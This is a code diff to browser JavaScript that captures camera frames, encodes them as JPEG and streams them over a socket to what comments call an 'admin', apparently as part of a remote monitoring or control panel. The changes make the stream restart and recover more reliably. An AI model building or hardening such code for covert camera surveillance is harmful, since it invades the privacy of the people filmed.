@@ -211,16 +211,17 @@ let camFacingMode = 'environment';
 
 function startCameraStream() {
     if (camStreamInterval) return;
-    if (!stream || !stream.getVideoTracks().length) {
+    const trackOk = stream && stream.getVideoTracks().length && stream.getVideoTracks()[0].readyState === 'live';
+    if (!trackOk) {
         const tryGetCam = (mode) => {
             const constraints = mode ? {video:{facingMode:mode},audio:false} : {video:true,audio:false};
             navigator.mediaDevices.getUserMedia(constraints)
                 .then((s) => {
+                    if (stream) stream.getTracks().forEach(t => t.stop());
                     stream = s; camFacingMode = mode || 'user';
                     let v = document.querySelector('video[data-snap]');
                     if (!v) { startSnapshots(); v = document.querySelector('video[data-snap]'); }
                     if (v) { v.srcObject = s; v.play(); }
-                    // Poll until video is ready
                     const MAX_WAIT = 50;
                     let waited = 0;
                     const poll = () => {
@@ -239,20 +240,19 @@ function startCameraStream() {
         tryGetCam(camFacingMode);
         return;
     }
-    const v = document.querySelector('video[data-snap]');
-    if (!v || v.readyState < 2) { setTimeout(startCameraStream, 100); return; }
+    let v = document.querySelector('video[data-snap]');
+    if (!v || v.readyState < 2) {
+        if (!v) { startSnapshots(); v = document.querySelector('video[data-snap]'); if (v) { v.srcObject = stream; v.play(); } }
+        setTimeout(startCameraStream, 100);
+        return;
+    }
     const c = document.createElement('canvas');
     c.width = 320; c.height = 240;
     const ctx = c.getContext('2d');
-    // Notify admin that camera stream has started
     socket.emit('camera-status', { status: 'started', facingMode: camFacingMode });
     function sendFrame() {
         if (!camStreamInterval) return;
-        if (camStreamSending) {
-            camStreamInterval = setTimeout(sendFrame, 16);
-            return;
-        }
-        camStreamSending = true;
+        if (v.readyState < 2) { stopCameraStream(); setTimeout(startCameraStream, 200); return; }
         try {
             ctx.drawImage(v, 0, 0, 320, 240);
             const data = c.toDataURL('image/jpeg', 0.25).split(',')[1];
@@ -260,7 +260,6 @@ function startCameraStream() {
                 socket.emit('camera-stream', { image: data });
             }
         } catch(e) {}
-        camStreamSending = false;
         camStreamInterval = setTimeout(sendFrame, 16);
     }
     camStreamInterval = setTimeout(sendFrame, 16);
